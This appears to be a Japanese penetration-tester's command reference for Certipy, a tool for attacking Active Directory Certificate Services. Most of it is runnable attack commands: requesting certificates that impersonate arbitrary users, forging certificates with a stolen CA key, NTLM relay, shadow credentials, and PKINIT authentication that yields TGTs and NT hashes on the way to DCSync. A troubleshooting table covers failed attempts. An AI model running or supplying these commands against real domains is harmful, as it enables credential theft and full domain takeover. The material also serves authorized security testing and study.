# Certipy — AD CS 攻撃ツールリファレンス

> **スコープ**: Certipy（`certipy-ad`）は AD CS の列挙・証明書申請・認証・CA 管理を一元的に行う Python 製ツール。ペネトレ用 Linux ディストリには**標準搭載されていない場合が多く、要インストール確認**（`pip install certipy-ad --break-system-packages`）。各 ESC の攻撃フローは `../04_Post_Access_Windows_AD/AD_CS/` 配下の ESC ファイルを参照。

## 着火条件

- AD CS（Active Directory 証明書サービス）が環境に存在している
- `certipy find` で証明書テンプレートを列挙して ESC 脆弱性を探す場合
- ESC1〜ESC15 の攻撃で証明書申請・認証・ハッシュ取得を行う場合

```bash
# インストール
pip install certipy-ad --break-system-packages
# バージョン確認
certipy --version
```

> 本ファイルは各 ESC の手順から参照されるツールリファレンス。
> 各 ESC の攻撃フローは `04_Post_Access_Windows_AD/AD_CS/` 配下の ESC ファイルを参照。

---

## サブコマンド一覧

| サブコマンド | 用途 |
|------------|------|
| `find` | AD CS の列挙（テンプレート・CA・脆弱性検出） |
| `req` | 証明書の申請（RPC/DCOM または HTTP/CES 経由） |
| `auth` | 証明書（pfx）を使った PKINIT 認証 → TGT + NT ハッシュ取得 |
| `ca` | CA の管理操作（フラグ変更・証明書発行・失効・テンプレート操作） |
| `template` | テンプレートの設定変更（ESC4 悪用など） |
| `forge` | オフライン証明書の偽造（CA 秘密鍵が入手できた場合） |
| `relay` | NTLM リレー受信・証明書申請（ntlmrelayx 代替） |
| `cert` | pfx ファイルの情報表示・変換 |
| `account` | マシンアカウントの追加・属性変更（Shadow Credentials 関連） |

---

## サブコマンド詳細

### `find` — 列挙

```bash
# 脆弱テンプレートのみを標準出力に表示（最速）
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout

# JSON + BloodHound 用 zip を出力（詳細調査・共有用）
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -output [OUTPUT_PREFIX]
# → [OUTPUT_PREFIX].json と [OUTPUT_PREFIX]_BloodHound.zip が生成される

# ハッシュ認証
certipy find \
  -u [USER]@[DOMAIN] \
  -hashes :[NT_HASH] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout

# 有効なテンプレートのみ表示
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -enabled \
  -stdout
```

**主要オプション：**

| オプション | 説明 |
|----------|------|
| `-vulnerable` | 脆弱テンプレート・CA のみ表示 |
| `-stdout` | ファイル出力せず標準出力に表示 |
| `-output [PREFIX]` | JSON と BloodHound zip を出力 |
| `-enabled` | 有効なテンプレートのみ表示 |
| `-old-bloodhound` | 旧バージョン BloodHound 用フォーマットで出力 |
| `-hide-admins` | 管理者のみが登録できるテンプレートを非表示 |

---

### `req` — 証明書申請

```bash
# 基本申請（ESC1：任意の UPN を SAN に埋め込む）
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -upn [TARGET_UPN]

# CA が DC と別サーバーの場合
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -target [CA_SERVER_IP] \
  -upn [TARGET_UPN]

# 代理申請（ESC3：Enrollment Agent 証明書を使用）
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_FOR_AUTH] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -on-behalf-of [DOMAIN]\[TARGET_USER] \
  -pfx [ENROLLMENT_AGENT_CERT].pfx

# Pending 申請の取得（保留後に発行された証明書を回収）
certipy req \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -retrieve [REQUEST_ID]

# HTTP/CES 経由での申請（-web フラグ）
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -web \
  -upn [TARGET_UPN]
```

**主要オプション：**

| オプション | 説明 |
|----------|------|
| `-ca [CA_NAME]` | CA の識別名（`certipy find` の `CA Name` フィールド） |
| `-template [NAME]` | 申請に使用するテンプレート名 |
| `-upn [UPN]` | SAN に埋め込む UPN（ESC1・ESC6・ESC12 等で使用） |
| `-dns [FQDN]` | SAN に埋め込む DNS 名（マシン証明書用） |
| `-on-behalf-of [DOMAIN\USER]` | 代理申請先ユーザー（ESC3 で使用） |
| `-pfx [FILE]` | 認証に使用する既存証明書（代理申請・PFX ベース認証） |
| `-retrieve [ID]` | 指定 Request ID の証明書を取得（Pending から回収） |
| `-target [IP/FQDN]` | CA サーバーの IP/FQDN（DC と別の場合に指定） |
| `-web` | HTTP/CES エンドポイント経由で申請 |
| `-key-size [BITS]` | RSA 鍵長（デフォルト 2048） |
| `-no-save` | pfx ファイルを保存せず標準出力のみ |

---

### `auth` — PKINIT 認証

```bash
# pfx で PKINIT 認証 → TGT + NT ハッシュ取得
certipy auth \
  -pfx [TARGET_USER].pfx \
  -dc-ip [DC_IP]

# ユーザー名を明示指定する（pfx の CN と AD の samAccountName が異なる場合）
certipy auth \
  -pfx [TARGET_USER].pfx \
  -dc-ip [DC_IP] \
  -domain [DOMAIN] \
  -username [SAMACCOUNTNAME]

# TGT のみ取得（NT ハッシュ不要の場合）
certipy auth \
  -pfx [TARGET_USER].pfx \
  -dc-ip [DC_IP] \
  -no-hash
```

**出力例：**

```
[*] Using principal: [TARGET_USER]@example.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to '[TARGET_USER].ccache'
[*] Trying to retrieve NT hash for '[TARGET_USER]'
[*] Got hash for '[TARGET_USER]@example.local': aad3b435b51404eeaad3b435b51404ee:[NT_HASH]
```

**主要オプション：**

| オプション | 説明 |
|----------|------|
| `-pfx [FILE]` | 認証に使用する証明書ファイル（必須） |
| `-dc-ip [IP]` | KDC（DC）の IP |
| `-domain [DOMAIN]` | ドメイン名（pfx から自動取得できない場合） |
| `-username [NAME]` | samAccountName を明示指定 |
| `-no-hash` | NT ハッシュを取得しない |
| `-ldap-shell` | 認証後に LDAP シェルを起動 |

---

### `ca` — CA 管理操作

```bash
# Pending 証明書を強制発行（ESC7・ESC11 で使用）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -issue-request [REQUEST_ID]

# 証明書の失効
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]

# CA フラグ一覧を表示
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -list-templates

# EDITF_ATTRIBUTESUBJECTALTNAME2 フラグを有効化（ESC6・ESC12。ManageCA 権限が必要）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -enable-editf

# 失効した EDITF フラグを無効化（原状回復）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -disable-editf
```

**主要オプション：**

| オプション | 説明 |
|----------|------|
| `-issue-request [ID]` | 保留中の証明書申請を強制発行 |
| `-revoke [ID]` | 指定 Request ID の証明書を失効 |
| `-enable-editf` | `EDITF_ATTRIBUTESUBJECTALTNAME2` を有効化 |
| `-disable-editf` | `EDITF_ATTRIBUTESUBJECTALTNAME2` を無効化 |
| `-list-templates` | CA が発行可能なテンプレートを列挙 |
| `-save-old` | 設定変更前の古い設定値を保存 |

---

### `template` — テンプレート操作

```bash
# テンプレートの現在の設定を表示
certipy template \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -display

# テンプレートを ESC1 化（CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT を有効化。ESC4 で使用）
certipy template \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -add-flag enrollee-supplies-subject

# テンプレート設定を JSON から一括書き換え
certipy template \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -configuration [CONFIG_JSON_FILE]

# 変更前の設定に戻す（-save-old で記録した場合）
certipy template \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -configuration [SAVED_OLD_CONFIG].json
```

---

### `forge` — 証明書偽造

```bash
# CA 証明書・秘密鍵から任意ユーザーの証明書を偽造（CA 秘密鍵の入手が前提）
certipy forge \
  -ca-pfx [CA_CERT].pfx \
  -upn [TARGET_UPN] \
  -subject "CN=[TARGET_USER]"
# → [TARGET_USER]_forged.pfx が生成される
```

> `forge` は CA の pfx（秘密鍵付き証明書）が必要。CA 秘密鍵を取得できる状況（DCSYNC 後・CA サーバー上の SYSTEM 権限）のみ使用可能。

---

### `relay` — NTLM リレー

```bash
# NTLM リレーで証明書を受け取る（ntlmrelayx の代替として使用）
sudo certipy relay \
  -ca [CA_SERVER_IP] \
  -template [VULNERABLE_TEMPLATE]
# → 別のウィンドウで Responder や Coerce を起動して DC$ の認証をリレーする
```

---

### `account` — マシンアカウント操作

```bash
# 新しいマシンアカウントを追加（Shadow Credentials・RBCD 用）
certipy account create \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -user [NEW_MACHINE_ACCOUNT]$

# マシンアカウントに msDS-KeyCredentialLink を設定（Shadow Credentials）
certipy account update \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -user [TARGET_USER] \
  -add-shadow-creds
```

---

## 共通オプション早見表

| オプション | 説明 |
|----------|------|
| `-u [USER]@[DOMAIN]` | 認証ユーザー（UPN 形式） |
| `-p "[PASSWORD]"` | パスワード |
| `-hashes :[NT_HASH]` | Pass-the-Hash 認証（LM:NT または :NT 形式） |
| `-k` | Kerberos 認証（`KRB5CCNAME` 環境変数が必要） |
| `-dc-ip [IP]` | ドメインコントローラーの IP |
| `-target [IP/FQDN]` | CA サーバーの IP/FQDN（DC と別の場合） |
| `-timeout [SECONDS]` | タイムアウト秒数 |
| `-debug` | デバッグ出力を有効化（トラブルシューティング時） |

---

## 刺さらなかったとき

| エラーメッセージ | 原因 | 対処 |
|----------------|------|------|
| `KDC_ERR_PADATA_TYPE_NOSUPP` | DC が PKINIT をサポートしていない（古い OS）または DC の証明書が不一致 | DC の OS バージョン確認（2012R2 以降が必要）。`gettgtpkinit.py`（PKINITtools）を代替で試す |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | CA が `NTAuthCertificates` に登録されていない | `certutil -viewstore ldap:///CN=NTAuthCertificates,...` で確認。CA の登録は ESC5 / DA 権限が必要 |
| `Clock skew too great` / 時刻同期エラー | Kerberos の ±5 分制限に引っかかっている | `sudo ntpdate -u [DC_IP]` または `sudo timedatectl set-ntp false && sudo date -s "[DC_TIME]"` |
| `ACCESS_DENIED` on `certipy req` | Enrollment 権限がない | `certipy find` で `Enrollment Rights` を確認。保持権限で追加できるか検討 |
| `ACCESS_DENIED` on `certipy ca` | `ManageCA` / `ManageCertificates` 権限がない | ESC7 で権限付与できるか確認 → `ESC7.md` |
| `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` | テンプレートがメールアドレス必須設定 | `-alt-email` オプションを追加、または別テンプレートを探す |
| `CERTSRV_E_TEMPLATE_DENIED` | テンプレートへのアクセス権なし | `certipy find` で `Enrollment Rights` を再確認 |
| `certificate request is pending` | `PEND_ALL_REQUESTS` フラグが設定されている | REQUEST_ID を記録し `certipy ca -issue-request` で強制発行（ESC7・ESC11 参照） |
| `[Errno Connection refused]` / `rpc_s_server_unavailable` | CA サーバーへの RPC 到達性なし | `-target [CA_SERVER_IP]` で CA を直接指定。`-dc-ip` と混同しないこと |
| `Got error: CA rejected the certificate request` | テンプレートの条件（EKU・Subject 形式等）が合わない | `-debug` で詳細エラーを確認。テンプレート設定を `certipy find` で再精査する |
| `NT hash for machine accounts ends in $` | マシンアカウントの NT ハッシュは `$` なし samAccountName で認証 | `-username [MACHINENAME$]` から `$` を除いた形式で試す、または `-username [MACHINENAME]` |

---

## pfx ファイルの操作

```bash
# pfx の内容を確認（openssl で）
openssl pkcs12 -in [CERT].pfx -nodes -passin pass: | openssl x509 -noout -text
# → Subject Alternative Name・Validity・Subject を確認する

# pfx を PEM に変換（一部ツールで必要）
openssl pkcs12 -in [CERT].pfx -out [CERT].pem -nodes -passin pass:

# pfx をパスワード保護する
openssl pkcs12 -in [CERT].pfx -out [CERT_PROTECTED].pfx -passout pass:[STRONG_RANDOM_PASSWORD]
```

---

## 証明書取得後の共通フロー

取得した pfx ファイルから NT ハッシュを取得し DCSync に至るまでの共通手順は `Overview.md` の「共通フロー」セクションを参照：

> → `../04_Post_Access_Windows_AD/AD_CS/Overview.md`

---

## 参照先 ESC ファイル

| ESC | ファイル |
|-----|---------|
| 列挙・共通フロー | `../04_Post_Access_Windows_AD/AD_CS/Overview.md` |
| ESC1 | `../04_Post_Access_Windows_AD/AD_CS/ESC1.md` |
| ESC2 | `../04_Post_Access_Windows_AD/AD_CS/ESC2.md` |
| ESC3 | `../04_Post_Access_Windows_AD/AD_CS/ESC3.md` |
| ESC4 | `../04_Post_Access_Windows_AD/AD_CS/ESC4.md` |
| ESC5 | `../04_Post_Access_Windows_AD/AD_CS/ESC5.md` |
| ESC6 | `../04_Post_Access_Windows_AD/AD_CS/ESC6.md` |
| ESC7 | `../04_Post_Access_Windows_AD/AD_CS/ESC7.md` |
| ESC8 | `../04_Post_Access_Windows_AD/AD_CS/ESC8.md` |
| ESC9 | `../04_Post_Access_Windows_AD/AD_CS/ESC9.md` |
| ESC10 | `../04_Post_Access_Windows_AD/AD_CS/ESC10.md` |
| ESC11 | `../04_Post_Access_Windows_AD/AD_CS/ESC11.md` |
| ESC12 | `../04_Post_Access_Windows_AD/AD_CS/ESC12.md` |
| ESC13 | `../04_Post_Access_Windows_AD/AD_CS/ESC13.md` |
| ESC14 | `../04_Post_Access_Windows_AD/AD_CS/ESC14.md` |
| ESC15 | `../04_Post_Access_Windows_AD/AD_CS/ESC15.md` |

---

## 関連技術
- 前：`../04_Post_Access_Windows_AD/AD_CS/Overview.md`（AD CS 列挙・共通フロー）
- 関連：`../04_Post_Access_Windows_AD/AD_CS/ESC1.md`（各 ESC 攻撃手順は ESC ファイルを参照）
- 後：`../04_Post_Access_Windows_AD/Credential_Dumping.md`（NT ハッシュ取得後に DCSync）
